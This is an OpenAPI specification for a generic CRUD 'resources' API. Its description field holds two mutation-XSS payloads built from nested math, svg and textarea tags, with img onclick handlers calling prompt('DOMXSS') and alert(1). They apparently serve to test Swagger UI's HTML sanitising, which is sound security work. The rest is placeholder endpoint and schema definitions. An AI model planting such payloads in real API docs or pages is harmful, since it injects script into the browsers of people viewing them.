openapi: 3.0.1
info:
  title: Classic API Resource Documentation
  description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onclick=prompt('DOMXSS') src='https://raw.githubusercontent.com/AbraXa5/swaggeruitest/refs/heads/main/img.jpg'>"></form>
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='https://raw.githubusercontent.com/AbraXa5/swaggeruitest/refs/heads/main/img.jpg' onclick='alert(1)'>">
  version: 1.0.0
  contact:
    name: API Support
    email: support@example.com

servers:
  - url: https://api.example.com/v1
    description: Production server
  - url: https://sandbox.api.example.com/v1
    description: Sandbox server

tags:
  - name: Resources
    description: Operations related to resources

paths:
  /resources:
    get:
      tags:
        - Resources
      summary: List resources
      description: Returns a paginated list of resources.
      operationId: listResources
      parameters:
        - name: page
          in: query
          description: Page number
          required: false
          schema:
            type: integer
            example: 1
        - name: size
          in: query
          description: Page size
          required: false
          schema:
            type: integer
            example: 25
        - name: sort
          in: query
          description: Sort field
          required: false
          schema:
            type: string
            example: createdAt
      responses:
        '200':
          description: Successful response
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ResourceListResponse'
        '400':
          $ref: '#/components/responses/BadRequest'
        '500':
          $ref: '#/components/responses/InternalServerError'

    post:
      tags:
        - Resources
      summary: Create a resource
      description: Creates a new resource.
      operationId: createResource
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/CreateResourceRequest'
      responses:
        '201':
          description: Resource created
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Resource'
        '400':
          $ref: '#/components/responses/BadRequest'
        '409':
          description: Conflict
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'

  /resources/{resourceId}:
    get:
      tags:
        - Resources
      summary: Get a resource by ID
      description: Retrieves a single resource by its unique identifier.
      operationId: getResourceById
      parameters:
        - $ref: '#/components/parameters/ResourceIdPathParam'
      responses:
        '200':
          description: Successful response
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Resource'
        '404':
          $ref: '#/components/responses/NotFound'

    put:
      tags:
        - Resources
      summary: Update a resource
      description: Replaces an existing resource.
      operationId: updateResource
      parameters:
        - $ref: '#/components/parameters/ResourceIdPathParam'
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/UpdateResourceRequest'
      responses:
        '200':
          description: Resource updated
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Resource'
        '400':
          $ref: '#/components/responses/BadRequest'
        '404':
          $ref: '#/components/responses/NotFound'

    delete:
      tags:
        - Resources
      summary: Delete a resource
      description: Deletes a resource by ID.
      operationId: deleteResource
      parameters:
        - $ref: '#/components/parameters/ResourceIdPathParam'
      responses:
        '204':
          description: Resource deleted successfully
        '404':
          $ref: '#/components/responses/NotFound'

components:
  parameters:
    ResourceIdPathParam:
      name: resourceId
      in: path
      description: Unique identifier of the resource
      required: true
      schema:
        type: string
        example: res_12345

  schemas:
    Resource:
      type: object
      required:
        - id
        - name
        - status
        - createdAt
      properties:
        id:
          type: string
          example: res_12345
        name:
          type: string
          example: Test Resource
        description:
          type: string
          example: Sample resource used for testing
        status:
          type: string
          enum:
            - ACTIVE
            - INACTIVE
            - DELETED
          example: ACTIVE
        createdAt:
          type: string
          format: date-time
          example: 2026-04-09T10:30:00Z
        updatedAt:
          type: string
          format: date-time
          example: 2026-04-09T11:00:00Z

    CreateResourceRequest:
      type: object
      required:
        - name
      properties:
        name:
          type: string
          example: Test Resource
        description:
          type: string
          example: Sample resource created for testing

    UpdateResourceRequest:
      type: object
      properties:
        name:
          type: string
          example: Updated Resource Name
        description:
          type: string
          example: Updated description
        status:
          type: string
          enum:
            - ACTIVE
            - INACTIVE
            - DELETED
          example: INACTIVE

    ResourceListResponse:
      type: object
      properties:
        data:
          type: array
          items:
            $ref: '#/components/schemas/Resource'
        page:
          type: integer
          example: 1
        size:
          type: integer
          example: 25
        totalElements:
          type: integer
          example: 125
        totalPages:
          type: integer
          example: 5

    ErrorResponse:
      type: object
      properties:
        code:
          type: string
          example: BAD_REQUEST
        message:
          type: string
          example: Invalid request parameters
        details:
          type: array
          items:
            type: string
          example:
            - name must not be empty

  responses:
    BadRequest:
      description: Bad request
      content:
        application/json:
          schema:
            $ref: '#/components/schemas/ErrorResponse'

    NotFound:
      description: Resource not found
      content:
        application/json:
          schema:
            $ref: '#/components/schemas/ErrorResponse'

    InternalServerError:
      description: Internal server error
      content:
        application/json:
          schema:
            $ref: '#/components/schemas/ErrorResponse'
